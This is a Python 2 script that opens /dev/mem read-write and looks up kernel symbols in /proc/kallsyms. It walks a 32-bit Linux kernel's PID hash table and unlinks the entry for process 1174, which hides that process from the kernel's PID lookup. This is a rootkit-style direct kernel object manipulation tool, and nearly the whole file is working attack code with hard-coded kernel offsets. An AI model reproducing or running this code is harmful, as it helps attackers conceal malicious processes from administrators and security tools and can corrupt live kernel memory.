#!/usr/bin/python

import os, sys
from ctypes import *

class SymbolFinder:
	def __init__(self):
		self.fd = open("/proc/kallsyms","r");

	def find(self, symbol):
		newsym = " " + symbol + "\n"
		self.fd.seek(0)
		for line in self.fd:
			if line.endswith(newsym):
				return int(line.split(' ')[0], 16)

class DevMemReader:
	def __init__(self, symbol_finder):
		self.sf = symbol_finder;
		self.fd = open("/dev/mem","r+b")
		self.swapper_pg_dir = self.sf.find("swapper_pg_dir");

	def _virt_to_phys(self, addr):
		pte = c_int()

		# Find the initial pg_dir for this address
		next = (self.swapper_pg_dir - 0xc0000000) | ((addr >> 20) & 0xffc)
		self._read(pte, next)

		# If this isn't a large page, then go one level deeper for the pte
		if (pte.value & 0x80) == 0:
			next = (pte.value & 0xfffff000) | ((addr >> 10) & 0xffc);
			self._read(pte, next)

		return (pte.value & 0xffc00000) | (addr & 0x003fffff)

	# read from a physical address
	def _read(self, dest, addr):
		try:
			self.fd.seek(addr)
			self.fd.readinto(dest)
		except:
		    print "Some error"


	# read from a virtual address into a ctype structure
	def read(self, dest, addr):
		self._read(dest, self._virt_to_phys(addr))

	def _write(self, src, addr):
		self.fd.seek(addr)
		self.fd.write(src)

	def write(self, src, addr):
		self._write(src, self._virt_to_phys(addr))

	# read a 4-byte value.  Do with it what you will...
	def read_int(self, addr):
		tmp = c_uint()
		self.read(tmp,addr)
		return tmp.value

class hlist_node(Structure):
	_fields_ = [	('next', c_uint),
			('pprev', c_uint)
		   ]

	def remove(self, dm):
		pprev = hlist_node()
		next = hlist_node()

		if self.pprev != 0:
			dm.read(pprev, self.pprev)
			pprev.next = self.next
			dm.write(pprev, self.pprev)

		if self.next != 0:
			dm.read(next, self.next)
			next.pprev = self.pprev
			dm.write(next, self.next)

class pid(Structure):
	_fields_ = [	('junk1', c_char * 28),
			('nr', c_int),
			('ns', c_void_p),
			('pid_chain', hlist_node)
		   ]

class TaskStruct(Structure):
	_fields_ = [ 	('junk1',c_char * 456), 
			('next_task',c_void_p), 
			('prev_tast',c_void_p),
			('junk2',c_char * 56),
			('pid', c_int)
		   ]

class PidHash:
	def __init__(self, sf, dm):
		self.tptr = 0
		self.inc = 0
		self.sf = sf
		self.dm = dm
		self.pidhash_shift = dm.read_int(sf.find("pidhash_shift"))
		self.pid_hash = dm.read_int(sf.find("pid_hash"))
		print hex(self.pid_hash)

	def print_all(self):
		spid = pid()
		for i in range(0, 1 << self.pidhash_shift):
			tptr = dm.read_int(self.pid_hash+4*i)
			while tptr != 0:
				dm.read(spid,tptr-36)
				print "PID: ",
				print spid.nr
				tptr = spid.pid_chain.next;

	def find(self, nr):
                spid = pid()
                for i in range(0, 1 << self.pidhash_shift):
                        tptr = dm.read_int(self.pid_hash+4*i)
                        while tptr != 0:
                                dm.read(spid,tptr-36)
				if spid.nr == nr:
					return spid
                                tptr = spid.pid_chain.next;
		return None


###########
sf = SymbolFinder()
dm = DevMemReader(sf)
p = TaskStruct()

# Start by searching kallsyms for our important symbols.

ph = PidHash(sf,dm)

t = ph.find(1174)
if t != None:
	print "Found " + str(t.nr)
	t.pid_chain.remove(dm)


"""
init_task = sf.find("init_task");

dm.read(p,init_task)
print p.pid

while True:
	dm.read(p,p.next_task - 456)
	print p.pid
	#print hex(p.next_task)
	if p.pid == 0:
		break
"""
